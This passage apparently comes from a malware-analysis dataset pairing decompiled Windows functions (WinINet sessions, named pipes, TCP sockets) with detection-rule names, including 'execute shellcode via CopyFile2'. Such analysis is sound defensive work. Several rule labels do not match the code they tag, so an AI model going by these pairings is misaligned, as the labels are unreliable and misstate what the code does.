}\n            else if ((*(in_EAX + 0x70) != 0) && (*(in_EAX + 0x58) != 0)) {\n                iVar4 = fcn.2001e958();\n                if (iVar4 != 0) {\n                    fcn.20001567(0x2004706c);\n                    pcVar1 = _sym.imp.msvcrt.dll_free;\n                    *0x20047084 = 0;\n                    (*_sym.imp.msvcrt.dll_free)(*0x20047088);\n                    *0x20047088 = 0;\n                    (*pcVar1)(*0x2004708c);\n                    *0x2004708c = 0;\n                    (*pcVar1)(*0x20047090);\n                    *0x20047090 = 0;\n                    fcn.2000157d(0x2004706c);\n                    goto code_r0x2001eadb;\n                }\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 551
    },
    "2001eb8b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.2001eb8b(void)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    pcVar1 = _sym.imp.WININET.dll_InternetCloseHandle;\n    if ((*(in_EAX + 0x70) == 0) || (*(in_EAX + 0x58) == 0)) {\ncode_r0x2001ec2d:\n        uVar3 = 0xffffffff;\n    }\n    else {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(in_EAX + 0xc));\n        iVar2 = (*_sym.imp.WININET.dll_InternetOpenA)(\"Mozilla/4.0 (compatible; MSIE 6.0)\", 0, 0, 0, 0x10000000);\n        *(in_EAX + 0xc) = iVar2;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.WININET.dll_InternetSetStatusCallback)(iVar2, fcn.2001e446);\n            if (iVar2 == -1) {\n                (*pcVar1)(*(in_EAX + 0xc));\n                *(in_EAX + 0xc) = 0;\n            }\n            else {\n                iVar2 = fcn.2001e958();\n                if (iVar2 != 0) goto code_r0x2001ec2d;\n                fcn.20001567(0x2004706c);\n                *0x20047088 = 0;\n                *0x2004708c = 0;\n                *0x20047090 = (*_sym.imp.msvcrt.dll__strdup)(\"Mozilla/4.0 (compatible; MSIE 6.0)\");\n                *0x20047084 = 1;\n                fcn.2000157d(0x2004706c);\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 437
    },
    "2001ec35": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.2001ec35(void)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t unaff_ESI;\n    \n    pcVar2 = _sym.imp.WININET.dll_InternetCloseHandle;\n    pcVar1 = *(unaff_ESI + 0x6c);\n    pcVar5 = \"Mozilla/4.0 (compatible; MSIE 6.0)\";\n    if (pcVar1 != NULL) {\n        pcVar5 = pcVar1;\n    }\n    if (((*(unaff_ESI + 100) == 0) && (*(unaff_ESI + 0x68) == 0)) && (pcVar1 == NULL)) {\ncode_r0x2001ecf6:\n        uVar4 = 0xffffffff;\n    }\n    else {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(unaff_ESI + 0xc));\n        iVar3 = (*_sym.imp.WININET.dll_InternetOpenA)(pcVar5, 3, *(unaff_ESI + 100), *(unaff_ESI + 0x68), 0x10000000);\n        *(unaff_ESI + 0xc) = iVar3;\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.WININET.dll_InternetSetStatusCallback)(iVar3, fcn.2001e446);\n            if (iVar3 == -1) {\n                (*pcVar2)(*(unaff_ESI + 0xc));\n                *(unaff_ESI + 0xc) = 0;\n            }\n            else if ((*(unaff_ESI + 0x70) != 0) && (*(unaff_ESI + 0x58) != 0)) {\n                iVar3 = fcn.2001e958();\n                if (iVar3 != 0) goto code_r0x2001ecf6;\n                fcn.20001567(0x2004706c);\n                pcVar2 = _sym.imp.msvcrt.dll__strdup;\n                *0x20047088 = (*_sym.imp.msvcrt.dll__strdup)(*(unaff_ESI + 100));\n                *0x2004708c = (*pcVar2)(*(unaff_ESI + 0x68));\n                *0x20047090 = (*pcVar2)(pcVar5);\n                *0x20047084 = 1;\n                fcn.2000157d(0x2004706c);\n            }\n        }\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 587
    },
    "2001f6da": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001f6da(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h;\n    iVar4 = 0;\n    if (((*(arg_8h + 0xc) != 0) && (*(arg_8h + 0xc) != -1)) || (*(arg_8h + 8) == 0)) {\n        return 0x21590065;\n    }\n    fcn.20001567(0x20047094);\n    if (((*(arg_8h + 0x48) == 0) && (*(arg_8h + 0x40) != 0)) &&\n       (iVar4 = fcn.20023f0e(*(arg_8h + 8), 0, *(arg_8h + 0x40), *(arg_8h + 0x44)),  iVar4 == 0)) {\n        *(arg_8h + 0x48) = 1;\n    }\n    fcn.2000157d(0x20047094);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar4 != 0) {\n        return iVar4;\n    }\n    iVar4 = *(arg_8h + 0x4c);\n    if (iVar4 < 1) {\n        var_4h = 0;\n        goto code_r0x2001f779;\n    }\n    if (iVar4 == 1) {\ncode_r0x2001f76e:\n        var_4h = 0;\n    }\n    else if (iVar4 == 2) {\n        var_4h = 0x10000;\n    }\n    else if (iVar4 == 3) {\n        var_4h = 0x20000;\n    }\n    else {\n        if (iVar4 != 4) goto code_r0x2001f76e;\n        var_4h = 0x30000;\n    }\n    var_4h = var_4h | 0x100000;\ncode_r0x2001f779:\n    arg_8h = 0;\n    var_4h = var_4h | 0x40000000;\n    iVar4 = 0xe7;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(*(iVar3 + 8), 0xc0000000, 0, 0, 3, var_4h, 0);\n        *(iVar3 + 0xc) = iVar2;\n        if (iVar2 != -1) break;\n        iVar2 = (*pcVar1)();\n        if (iVar2 != 0xe7) {\n            return iVar2;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitNamedPipeA)(*(iVar3 + 8), 5000);\n        if (iVar2 == 0) {\n            iVar3 = (*pcVar1)();\n            return iVar3;\n        }\n        arg_8h = arg_8h + 1;\n    } while (arg_8h < 4);\n    if (arg_8h < 4) {\n        var_8h = 2;\n        iVar4 = (*_sym.imp.KERNEL32.dll_SetNamedPipeHandleState)(*(iVar3 + 0xc), &var_8h, 0, 0);\n        if (iVar4 == 0) {\n            iVar4 = (*pcVar1)();\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(iVar3 + 0xc));\n            *(iVar3 + 0xc) = 0xffffffff;\n        }\n        else {\n            iVar4 = 0;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 856
    },
    "2001f819": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2001f819(int32_t lpNumberOfBytesWritten, uint lpBuffer, int32_t nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = lpNumberOfBytesWritten;\n    if ((*(lpNumberOfBytesWritten + 0xc) == 0) || (*(lpNumberOfBytesWritten + 0xc) == -1)) {\n        return 0x21590065;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(lpNumberOfBytesWritten + 100, 0);\n    if (iVar1 != 0) {\n        iVar1 = sub.ntdll.dll_strlen(*(iVar3 + 0x68), 0);\n        uVar2 = fcn.2001f819(iVar3, *(iVar3 + 0x68), iVar1 + 1);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n    }\n    if ((*(iVar3 + 0x54) == 0) || (nNumberOfBytesToWrite < 0x10000)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                          (*(iVar3 + 0xc), lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar3 != 0) {\n            return -(lpNumberOfBytesWritten != nNumberOfBytesToWrite) & 0x21590064;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (uVar2 == 0x6d) {\n            return 0x21590003;\n        }\n        if (uVar2 != 0x6f8) {\n            return uVar2;\n        }\n    }\n    return 0x2159000b;\n}\n",
        "token_count": 405
    },
    "2001f8c4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001f8c4(uint lpInBuffer, uint nInBufferSize, int32_t arg_10h, int32_t *arg_14h, int32_t **arg_18h, \n            uint dwMilliseconds)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint s2;\n    uint lpOverlapped;\n    int32_t hObject;\n    int32_t lpHandles;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *lpNumberOfBytesTransferred;\n    \n    *arg_14h = 0;\n    if ((*(in_EAX + 0xc) == 0) || (*(in_EAX + 0xc) == -1)) {\n        return 0x21590065;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(in_EAX + 100, 0);\n    if (iVar2 != 0) {\n        iVar2 = sub.ntdll.dll_strlen(*(in_EAX + 0x68), 0);\n        iVar2 = fcn.2001f819(in_EAX, *(in_EAX + 0x68), iVar2 + 1);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    sub.ntdll.dll_memset(&lpOverlapped, 0, 0x14);\n    hObject = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    if (hObject == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return iVar2;\n    }\n    lpNumberOfBytesTransferred = NULL;\n    if (arg_10h == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(*(in_EAX + 0xc));\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TransactNamedPipe)\n                          (*(in_EAX + 0xc), lpInBuffer, nInBufferSize, &s2, 0x100, &lpNumberOfBytesTransferred, \n                           &lpOverlapped);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        piVar4 = arg_14h;\n        if (iVar2 != 0x3e5) goto code_r0x2001fa20;\n        lpHandles = hObject;\n        var_ch = *(in_EAX + 0x38);\n        var_8h = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &lpHandles, 0, dwMilliseconds);\n        if (var_8h == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetOverlappedResult)\n                              (*(in_EAX + 0xc), &lpOverlapped, &lpNumberOfBytesTransferred, 0);\n            if (iVar2 != 0) goto code_r0x2001fa3f;\n            iVar2 = (*pcVar1)();\n            goto code_r0x2001fa20;\n        }\n        (*_sym.imp.KERNEL32.dll_CancelIo)(*(in_EAX + 0xc));\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetOverlappedResult)\n                          (*(in_EAX + 0xc), &lpOverlapped, &lpNumberOfBytesTransferred, 1);\n        if (iVar2 == 0) {\n            iVar2 = (*pcVar1)();\n        }\n        else {\n            iVar2 = 0;\n            piVar4 = lpNumberOfBytesTransferred;\n        }\n        if (var_8h != 0x102) goto code_r0x2001fa20;\n        if (iVar2 != 0) {\n            iVar2 = 0x21590002;\n            goto code_r0x2001fa20;\n        }\ncode_r0x2001fa24:\n        iVar3 = (*_sym.imp.msvcrt.dll_malloc)(piVar4);\n        *arg_14h = iVar3;\n        if (iVar3 != 0) {\n            sub.ntdll.dll_memcpy(iVar3, &s2, piVar4);\ncode_r0x2001fb89:\n            if (iVar2 == 0x6d) {\n                iVar2 = 0x21590003;\n            }\n            if (iVar2 == 0) {\n                *arg_18h = piVar4;\n            }\n            else if (*arg_14h != 0) {\n                (*_sym.imp.msvcrt.dll_free)(*arg_14h);\n                *arg_14h = 0;\n            }\n            goto code_r0x2001fbb2;\n        }\n    }\n    else {\ncode_r0x2001fa3f:\n        iVar2 = 0;\n        piVar4 = lpNumberOfBytesTransferred;\ncode_r0x2001fa20:\n        if (iVar2 == 0) goto code_r0x2001fa24;\n        if (iVar2 != 0xea) goto code_r0x2001fb89;\n        (*_sym.imp.KERNEL32.dll_GetOverlappedResult)(*(in_EAX + 0xc), &lpOverlapped, &lpNumberOfBytesTransferred, 0);\n        piVar4 = lpNumberOfBytesTransferred;\n        iVar2 = (*_sym.imp.KERNEL32.dll_PeekNamedPipe)(*(in_EAX + 0xc), 0, 0, 0, 0, &lpNumberOfBytesTransferred);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x2001fbb2;\n        }\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(lpNumberOfBytesTransferred + piVar4);\n        *arg_14h = iVar2;\n        if (iVar2 != 0) {\n            sub.ntdll.dll_memcpy(iVar2, &s2, piVar4);\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                              (*(in_EAX + 0xc), *arg_14h + piVar4, lpNumberOfBytesTransferred, \n                               &lpNumberOfBytesTransferred, &lpOverlapped);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar2 == 0x3e5) {\n                    lpHandles = hObject;\n                    var_ch = *(in_EAX + 0x38);\n                    iVar2 = 0;\n                    var_8h = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &lpHandles, 0, dwMilliseconds);\n                    if (var_8h == 0) {\n                        iVar3 = (*_sym.imp.KERNEL32.dll_GetOverlappedResult)\n                                          (*(in_EAX + 0xc), &lpOverlapped, &lpNumberOfBytesTransferred, 0);\n                        if (iVar3 == 0) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        }\n                        else {\n                            piVar4 = piVar4 + lpNumberOfBytesTransferred;\n                        }\n                    }\n                    else {\n                        (*_sym.imp.KERNEL32.dll_CancelIo)(*(in_EAX + 0xc));\n                        iVar3 = (*_sym.imp.KERNEL32.dll_GetOverlappedResult)\n                                          (*(in_EAX + 0xc), &lpOverlapped, &lpNumberOfBytesTransferred, 1);\n                        if (iVar3 == 0) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        }\n                        if (var_8h == 0x102) {\n                            iVar2 = 0x21590002;\n                        }\n                    }\n                }\n            }\n            else {\n                piVar4 = piVar4 + lpNumberOfBytesTransferred;\n                iVar2 = 0;\n            }\n            goto code_r0x2001fb89;\n        }\n    }\n    iVar2 = 0x21590004;\ncode_r0x2001fbb2:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    return iVar2;\n}\n",
        "token_count": 1814
    },
    "2001fcde": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.2001fcde(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint pSecurityDescriptor;\n    uint s;\n    uint *var_10h;\n    uint dwOpenMode;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    dwOpenMode = 0x40000003;\n    if ((*(unaff_ESI + 0x30) == 0) && (*(unaff_ESI + 0x50) != 0)) {\n        dwOpenMode = 0x40080003;\n    }\n    if (*(unaff_ESI + 0x3c) == 0) {\n        iVar1 = fcn.20001ac0(&var_4h);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(&pSecurityDescriptor, 1);\n        if ((iVar1 == 0) ||\n           (iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(&pSecurityDescriptor, 1, *(unaff_ESI + 0x3c), 1)\n           ,  iVar1 == 0)) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            return iVar1;\n        }\n        var_4h = &pSecurityDescriptor;\n    }\n    sub.ntdll.dll_memset(&s, 0, 0xc);\n    var_10h = var_4h;\n    s = 0xc;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateNamedPipeA)\n                      (*(unaff_ESI + 4), dwOpenMode, 6, 0xff, 0x1000, 0x1000, 0xffffffff, &s);\n    if (var_4h != &pSecurityDescriptor) {\n        fcn.20001bcd(var_4h);\n    }\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        *(unaff_ESI + 0x30) = *(unaff_ESI + 0x30) + 1;\n        *(unaff_ESI + 0x14) = iVar1;\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 523
    },
    "200217ff": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.200217ff(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_84h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0x118) == -1) {\n        return 0x21590065;\n    }\n    if (*(arg_8h + 0x118) == 0) {\n        iVar1 = (*_sym.imp.WS2_32.dll_listen)(*(arg_8h + 4), 0x7fffffff);\n        if (iVar1 == -1) goto code_r0x20021838;\n        *(arg_8h + 0x118) = 1;\n    }\n    var_4h = 0x80;\n    iVar1 = (*_sym.imp.WS2_32.dll_accept)(*(arg_8h + 4), &var_84h, &var_4h);\n    if (iVar1 != -1) {\n        iVar3 = (*_sym.imp.msvcrt.dll_malloc)(0x158);\n        if (iVar3 == 0) {\n            (*_sym.imp.WS2_32.dll_closesocket)(iVar1);\n            return 0x21590004;\n        }\n        sub.ntdll.dll_memset(iVar3, 0, 0x158);\n        fcn.20001551(iVar3 + 0x120);\n        *(iVar3 + 0x118) = 0xffffffff;\n        *(iVar3 + 4) = iVar1;\n        sub.ntdll.dll_memcpy(iVar3 + 0x10, &var_84h, 0x80);\n        *(iVar3 + 8) = var_84h;\n        *arg_ch = iVar3;\n        return 0;\n    }\ncode_r0x20021838:\n    uVar2 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n    return uVar2;\n}\n",
        "token_count": 452
    },
    "200219da": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200219da(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_4h = 0;\n    if (arg_10h < 0x10001) {\n        iVar2 = (*_sym.imp.WS2_32.dll_send)(*(arg_8h + 4), arg_ch, arg_10h, 0);\n        if (iVar2 == -1) {\n            uVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        if (*(arg_8h + 0x144) != NULL) {\n            (**(arg_8h + 0x144))(*(arg_8h + 0x138), \"TCP: send\", 0, arg_10h, &var_ch);\n        }\n        fcn.20001567(arg_8h + 0x120);\n        pcVar1 = _sym.imp.WS2_32.dll_send;\n        var_8h = arg_10h;\n        do {\n            iVar2 = (*pcVar1)(*(arg_8h + 4), arg_ch, 0x10000, 0);\n            if (iVar2 == -1) goto code_r0x20021b08;\n            arg_ch = arg_ch + 0x10000;\n            var_4h = var_4h + 0x10000;\n            var_8h = var_8h + -0x10000;\n            if (*(arg_8h + 0x144) != NULL) {\n                (**(arg_8h + 0x144))(*(arg_8h + 0x138), \"TCP: send\", var_4h, arg_10h, &var_ch);\n            }\n        } while (0xffff < var_8h);\n        uVar3 = 0;\n        if (0 < arg_10h - var_4h) {\n            iVar2 = (*pcVar1)(*(arg_8h + 4), arg_ch, arg_10h - var_4h, 0);\n            if (iVar2 == -1) {\ncode_r0x20021b08:\n                uVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n            }\n            else if (*(arg_8h + 0x144) != NULL) {\n                (**(arg_8h + 0x144))(*(arg_8h + 0x138), \"TCP: send\", arg_10h, arg_10h, &var_ch);\n            }\n        }\n        fcn.2000157d(arg_8h + 0x120);\n        if (*(arg_8h + 0x140) != NULL) {\n            (**(arg_8h + 0x140))(*(arg_8h + 0x138), 0);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 709
    },
    "20021cb5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: optval\n\nuint __cdecl fcn.20021cb5(uint s)\n\n{\n    int32_t iVar1;\n    unkbyte3 in_ECX;\n    uchar auStack8 [3];\n    uint optval;\n    \n    _auStack8 = CONCAT13(1, in_ECX);\n    iVar1 = (*_sym.imp.WS2_32.dll_setsockopt)(s, 0xffff, 4, &optval, 1, _auStack8);\n    if (iVar1 == -1) {\n        (*_sym.imp.msvcrt.dll_perror)(\"SO_REUSEADDR\");\n    }\n    return 0;\n}\n",
        "token_count": 145
    },
    "20021f2e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20021f2e(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_10h;\n    \n    iVar3 = arg_8h;\n    if (*(arg_8h + 0x18) == -1) {\n        uVar1 = 0x21590065;\n    }\n    else {\n        if (*(arg_8h + 0x18) == 0) {\n            iVar2 = (*_sym.imp.WS2_32.dll_listen)(*(arg_8h + 4), 0x7fffffff);\n            if (iVar2 == -1) {\n                uVar1 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                return uVar1;\n            }\n            *(iVar3 + 0x18) = 1;\n        }\n        arg_8h = 0x10;\n        iVar3 = (*_sym.imp.WS2_32.dll_accept)(*(iVar3 + 4), &var_10h, &arg_8h);\n        if (iVar3 == -1) {\n            uVar1 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        }\n        else {\n            iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x58);\n            if (iVar2 == 0) {\n                (*_sym.imp.WS2_32.dll_closesocket)(iVar3);\n                uVar1 = 0x21590004;\n            }\n            else {\n                sub.ntdll.dll_memset(iVar2, 0, 0x58);\n                fcn.20001551(iVar2 + 0x30);\n                *(iVar2 + 0x18) = 0xffffffff;\n                *(iVar2 + 4) = iVar3;\n                sub.ntdll.dll_memcpy(iVar2 + 8, &var_10h, 0x10);\n                *arg_ch = iVar2;\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 462
    },
    "20021fef": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.20021fef(int32_t param_1, char *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar auStack140 [128];\n    uint uStack12;\n    char *pcStack8;\n    \n    pcStack8 = param_2;\n    iVar2 = fcn.20023757(&pcStack8, auStack140, 0x80, &param_2);\n    pcVar1 = _sym.imp.ntdll.dll__stricmp;\n    do {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*pcVar1)(auStack140, \"nodelay\");\n        if ((iVar2 == 0) && (iVar2 = (*_sym.imp.ntdll.dll_strchr)(\"Y1N0\", *param_2),  iVar2 != 0)) {\n            if ((*param_2 == 'Y') || (*param_2 == '1')) {\n                uStack12 = 1;\n            }\n            else {\n                uStack12 = 0;\n            }\n            iVar2 = (*_sym.imp.WS2_32.dll_setsockopt)(*(param_1 + 4), 6, 1, &uStack12, 4);\n            if (iVar2 == -1) {\n                uVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                return uVar3;\n            }\n        }\n        else {\n            iVar2 = (*pcVar1)(auStack140, \"ustart\");\n            if (iVar2 == 0) {\n                fcn.20025877(param_1 + 0x48, param_2);\n            }\n            else {\n                iVar2 = (*pcVar1)(auStack140, \"utimeout\");\n                if (iVar2 == 0) {\n                    fcn.2002588f(param_1 + 0x48, param_2);\n                }\n            }\n        }\n        iVar2 = fcn.20023757(&pcStack8, auStack140, 0x80, &param_2);\n    } while( true );\n}\n",
        "token_count": 465
    },
    "200221bb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200221bb(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint *arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10ch;\n    int32_t var_108h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_14h == 0xffffffff) {\n        arg_14h = NULL;\n    }\n    else {\n        var_8h = arg_14h / 1000;\n        var_4h = (arg_14h % 1000) * 1000;\n        arg_14h = &var_8h;\n    }\n    iVar1 = *arg_10h;\n    iVar4 = 0;\n    if (0 < iVar1) {\n        do {\n            var_108h = *(arg_8h + 4);\n            var_10ch = 1;\n            iVar2 = (*_sym.imp.WS2_32.dll_select)(var_108h + 1, &var_10ch, 0, 0, arg_14h);\n            if (iVar2 == 0) {\n                uVar3 = 0x21590002;\n                goto code_r0x2002226d;\n            }\n            if (iVar2 == -1) {\ncode_r0x2002227b:\n                uVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                return uVar3;\n            }\n            iVar2 = iVar1 - iVar4;\n            if (0x2000 < iVar2) {\n                iVar2 = 0x2000;\n            }\n            iVar2 = (*_sym.imp.WS2_32.dll_recv)(*(arg_8h + 4), arg_ch, iVar2, 0);\n            if (iVar2 == -1) goto code_r0x2002227b;\n            if (iVar2 == 0) {\n                return 0x21590003;\n            }\n            if ((arg_18h & 1) == 0) {\n                *arg_10h = iVar2;\n                return 0;\n            }\n            arg_ch = arg_ch + iVar2;\n            iVar4 = iVar4 + iVar2;\n        } while (iVar4 < iVar1);\n    }\n    uVar3 = 0;\ncode_r0x2002226d:\n    *arg_10h = iVar4;\n    return uVar3;\n}\n",
        "token_count": 570
    },
    "200027e2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.200027e2(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.20002744(param_1, param_2);\n    iVar2 = 0;\n    if (iVar1 != 0) {\n        for (iVar1 = *(iVar1 + 0x10); iVar1 != 0; iVar1 = *(iVar1 + 0x14)) {\n            iVar2 = iVar2 + 0x40 + *(iVar1 + 4);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 135
    },
    "20002a83": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.20002a83(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t arg_18h;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_4ch;\n    uint s2;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    if (in_EAX == 0) {\n        return -1;\n    }\n    fcn.200026a7();\n    arg_18h = 0x2c;\n    puVar1 = in_EAX + 8;\n    sub.ntdll.dll_memcpy(&s2, puVar1, 0x2c);\n    uVar2 = *puVar1;\n    if (uVar2 <= *(in_EAX + 0x1c) && *(in_EAX + 0x1c) != uVar2) {\n        *(in_EAX + 0x1c) = uVar2;\n        iVar3 = fcn.2000282f();\n        if (iVar3 != 0) goto code_r0x20002b9f;\n    }\n    if (0x2c < *(in_EAX + 0x1c)) {\n        do {\n            iVar3 = (**(*(in_EAX + 0x44) + 0x14))(*(in_EAX + 0x48), &var_78h, 0x40, arg_18h);\n            if (iVar3 != 0) goto code_r0x20002b9f;\n            if (((*(in_EAX + 0x1c) < arg_18h + 0x40) || (uVar2 = var_4ch + 0x40 + arg_18h,  uVar2 <= arg_18h)) ||\n               (*(in_EAX + 0x1c) < uVar2)) break;\n            if (var_70h == 0xffff) {\n                var_ch = var_ch + 1;\n            }\n            else {\n                var_8h = var_8h + 1;\n                var_4h = fcn.2000285a();\n                if ((var_4h != 0) ||\n                   (var_4h = fcn.200028a0(var_78h, var_70h, var_74h, var_6ch, arg_18h, var_4ch),  var_4h != 0))\n                goto code_r0x20002ba6;\n            }\n            arg_18h = arg_18h + 0x40 + var_4ch;\n        } while (arg_18h < *(in_EAX + 0x1c));\n    }\n    *(in_EAX + 0x18) = var_8h;\n    *(in_EAX + 0x20) = var_ch;\n    *(in_EAX + 0x1c) = 